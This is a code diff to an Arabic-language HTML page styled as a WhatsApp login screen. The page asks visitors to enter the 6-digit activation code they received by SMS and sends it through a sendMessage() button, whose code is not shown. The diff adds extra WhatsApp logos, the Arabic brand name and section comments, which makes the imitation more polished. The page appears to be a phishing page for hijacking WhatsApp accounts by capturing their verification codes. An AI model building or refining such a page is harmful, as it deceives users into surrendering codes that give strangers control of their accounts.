@@ -54,6 +54,11 @@
             padding: 20px;
         }
 
+        .container .design img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
         .container .logo img {
             height: 80px;
             margin-bottom: 20px;
@@ -127,20 +132,32 @@
     <header>
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
-            WhatsApp 
+            واتساب
         </div>
         <div class="menu">☰</div>
     </header>
 
     <!-- المحتوى -->
     <div class="container">
+        <!-- التصميم الجديد -->
+        <div class="design">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Design">
+        </div>
+
+        <!-- شعار واتساب -->
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
         </div>
+
+        <!-- العنوان -->
         <div class="title">تسجيل الدخول</div>
+
+        <!-- الوصف -->
         <div class="description">
             أدخل رمز التفعيل المكون من 6 أرقام الذي تلقيته من خلال رسالة نصية.
         </div>
+
+        <!-- نموذج الإدخال -->
         <div class="form-group">
             <input id="phoneNumber" type="text" placeholder="رمز التفعيل" maxlength="6" pattern="\d{6}" required>
             <button onclick="sendMessage()">متابعة</button>
